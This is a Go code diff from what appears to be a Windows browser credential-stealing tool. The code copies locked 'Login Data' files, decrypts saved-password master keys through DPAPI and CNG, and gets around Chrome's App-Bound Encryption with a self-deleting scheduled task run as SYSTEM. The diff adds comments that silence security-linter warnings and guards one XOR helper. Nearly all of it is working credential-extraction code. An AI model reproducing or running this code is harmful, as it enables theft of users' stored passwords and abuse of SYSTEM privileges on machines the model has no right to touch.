@@ -54,12 +54,12 @@ func localStatePath(browser string) string {
 // forceCopy streams src to dst, working around files that other processes
 // hold open with no read sharing (browsers do this to Login Data).
 func forceCopy(src, dst string) error {
-	s, err := os.Open(src)
+	s, err := os.Open(src) //#nosec G304 G703 -- src/dst are private temp snapshot paths built by the caller, not operator or network input
 	if err != nil {
 		return err
 	}
 	defer s.Close()
-	d, err := os.Create(dst)
+	d, err := os.Create(dst) //#nosec G304 -- private temp snapshot destination built by the caller
 	if err != nil {
 		return err
 	}
@@ -111,7 +111,7 @@ func unwrapDPAPIBytes(data []byte) ([]byte, error) {
 	if len(data) == 0 {
 		return nil, errors.New("empty blob")
 	}
-	in := windows.DataBlob{Size: uint32(len(data)), Data: &data[0]}
+	in := windows.DataBlob{Size: uint32(len(data)), Data: &data[0]} //#nosec G115 -- DPAPI blobs are in-memory and far below the 4 GiB ULONG limit
 	var out windows.DataBlob
 	if err := windows.CryptUnprotectData(&in, nil, nil, 0, nil, 0, &out); err != nil {
 		return nil, err
@@ -193,14 +193,14 @@ func cngDecrypt(keyName string, in []byte) ([]byte, error) {
 	var hProv uintptr
 	prov, _ := syscall.UTF16PtrFromString("Microsoft Software Key Storage Provider")
 	if r, _, _ := pNCryptOpenProv.Call(uintptr(unsafe.Pointer(&hProv)), uintptr(unsafe.Pointer(prov)), 0); r != 0 {
-		return nil, fmt.Errorf("NCryptOpenStorageProvider: 0x%x", uint32(r))
+		return nil, fmt.Errorf("NCryptOpenStorageProvider: 0x%x", uint32(r)) //#nosec G115 -- NTSTATUS is a 32-bit code carried in a uintptr return
 	}
 	defer pNCryptFree.Call(hProv)
 
 	kn, _ := syscall.UTF16PtrFromString(keyName)
 	var hKey uintptr
 	if r, _, _ := pNCryptOpenKey.Call(hProv, uintptr(unsafe.Pointer(&hKey)), uintptr(unsafe.Pointer(kn)), 0, 0); r != 0 {
-		return nil, fmt.Errorf("NCryptOpenKey(%s): 0x%x", keyName, uint32(r))
+		return nil, fmt.Errorf("NCryptOpenKey(%s): 0x%x", keyName, uint32(r)) //#nosec G115 -- NTSTATUS is a 32-bit code carried in a uintptr return
 	}
 	defer pNCryptFree.Call(hKey)
 
@@ -209,17 +209,23 @@ func cngDecrypt(keyName string, in []byte) ([]byte, error) {
 	var need uint32
 	if r, _, _ := pNCryptDecrypt.Call(hKey, uintptr(unsafe.Pointer(&in[0])), uintptr(len(in)),
 		0, 0, 0, uintptr(unsafe.Pointer(&need)), 0x40); r != 0 || need == 0 {
-		return nil, fmt.Errorf("NCryptDecrypt(size): 0x%x", uint32(r))
+		return nil, fmt.Errorf("NCryptDecrypt(size): 0x%x", uint32(r)) //#nosec G115 -- NTSTATUS is a 32-bit code carried in a uintptr return
 	}
 	out := make([]byte, need)
 	if r, _, _ := pNCryptDecrypt.Call(hKey, uintptr(unsafe.Pointer(&in[0])), uintptr(len(in)),
 		0, uintptr(unsafe.Pointer(&out[0])), uintptr(need), uintptr(unsafe.Pointer(&need)), 0x40); r != 0 {
-		return nil, fmt.Errorf("NCryptDecrypt: 0x%x", uint32(r))
+		return nil, fmt.Errorf("NCryptDecrypt: 0x%x", uint32(r)) //#nosec G115 -- NTSTATUS is a 32-bit code carried in a uintptr return
 	}
 	return out[:need], nil
 }
 
 func xorBytes(a, b []byte) []byte {
+	if len(b) == 0 {
+		// Fail closed instead of dividing by zero in the modulo below: an empty
+		// key means the caller has nothing to XOR with, and returning nil makes
+		// the downstream AEAD reject it on key size rather than panicking.
+		return nil
+	}
 	out := make([]byte, len(a))
 	for i := range a {
 		out[i] = a[i] ^ b[i%len(b)]
@@ -333,7 +339,7 @@ func ABEHelper(blobFile, keyFile string) int {
 		_ = os.WriteFile(keyFile, []byte("ERR:"+stage), 0o600)
 		return 3
 	}
-	raw, err := os.ReadFile(blobFile)
+	raw, err := os.ReadFile(blobFile) //#nosec G304 -- blobFile is written into our own MkdirTemp dir by runABESystemTask
 	if err != nil || len(raw) == 0 {
 		return fail("read-blob")
 	}
@@ -373,7 +379,7 @@ func ABEHelper(blobFile, keyFile string) int {
 	if err != nil || len(key) != 32 {
 		return fail("derive")
 	}
-	if err := os.WriteFile(keyFile, key, 0o600); err != nil {
+	if err := os.WriteFile(keyFile, key, 0o600); err != nil { //#nosec G703 -- keyFile lives in our own MkdirTemp dir; path is not attacker-controlled
 		return fail("write-key")
 	}
 	return 0
@@ -412,17 +418,17 @@ func runABESystemTask(blob []byte) ([]byte, error) {
 	// immediately; schedule a near-future slot we never wait for.
 	st := time.Now().Add(2 * time.Minute).Format("15:04")
 	tr := fmt.Sprintf(`"%s" -abe-helper "%s" "%s"`, exe, blobFile, keyFile)
-	if out, err := exec.Command("schtasks", "/Create", "/TN", task, "/TR", tr,
+	if out, err := exec.Command("schtasks", "/Create", "/TN", task, "/TR", tr, //#nosec G204 -- fixed argv, generated task name, temp paths; no shell and no external input
 		"/RU", "SYSTEM", "/SC", "ONCE", "/ST", st, "/F").CombinedOutput(); err != nil {
 		return nil, fmt.Errorf("schtasks create: %v (%s)", err, truncateForLog(out))
 	}
-	defer exec.Command("schtasks", "/Delete", "/TN", task, "/F").Run()
-	if out, err := exec.Command("schtasks", "/Run", "/TN", task).CombinedOutput(); err != nil {
+	defer exec.Command("schtasks", "/Delete", "/TN", task, "/F").Run()                          //#nosec G204 -- fixed argv, generated task name
+	if out, err := exec.Command("schtasks", "/Run", "/TN", task).CombinedOutput(); err != nil { //#nosec G204 -- fixed argv, generated task name
 		return nil, fmt.Errorf("schtasks run: %v (%s)", err, truncateForLog(out))
 	}
 	deadline := time.Now().Add(20 * time.Second)
 	for time.Now().Before(deadline) {
-		if data, err := os.ReadFile(keyFile); err == nil && len(data) > 0 {
+		if data, err := os.ReadFile(keyFile); err == nil && len(data) > 0 { //#nosec G304 -- keyFile lives in our own MkdirTemp dir
 			if bytes.HasPrefix(data, []byte("ERR:")) {
 				return nil, errors.New("abe helper: " + string(data[4:]))
 			}
@@ -451,7 +457,7 @@ func localStateField(browser, field string) ([]byte, error) {
 		return nil, err
 	}
 	defer os.Remove(tmp)
-	raw, err := os.ReadFile(tmp)
+	raw, err := os.ReadFile(tmp) //#nosec G304 -- tmp is a forceCopy of a fixed browser profile path into our own temp file
 	if err != nil {
 		return nil, err
 	}
@@ -558,7 +564,7 @@ func masterKey(browser string) (masterKeys, error) {
 		return mk, err
 	}
 	defer os.Remove(tmp)
-	raw, err := os.ReadFile(tmp)
+	raw, err := os.ReadFile(tmp) //#nosec G304 -- tmp is a forceCopy of a fixed browser profile path into our own temp file
 	if err != nil {
 		return mk, err
 	}
